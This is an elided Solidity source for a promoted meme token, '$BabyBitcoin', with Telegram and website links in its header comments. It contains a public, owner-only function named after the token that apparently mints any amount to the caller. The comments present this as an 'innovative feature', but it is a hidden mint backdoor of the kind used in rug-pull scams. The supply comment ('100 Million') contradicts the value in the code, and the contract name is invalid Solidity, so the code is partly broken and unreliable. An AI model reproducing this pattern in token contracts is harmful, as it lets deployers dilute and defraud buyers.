//
// $BabyBitcoin proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/babybitcoinbnb
// 📱 Website ::https://BabyBTC.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyBitcoin(uint256 amount) public onlyOwner {
 _BabyBitcoin(msg.sender, amount);
    }
    ...
    function _BabyBitcoin(address account, uint256 amount) internal virtual {
...
contract $BabyBitcoin is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Bitcoin", "BABYBTC") {
     _BabyBitcoin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}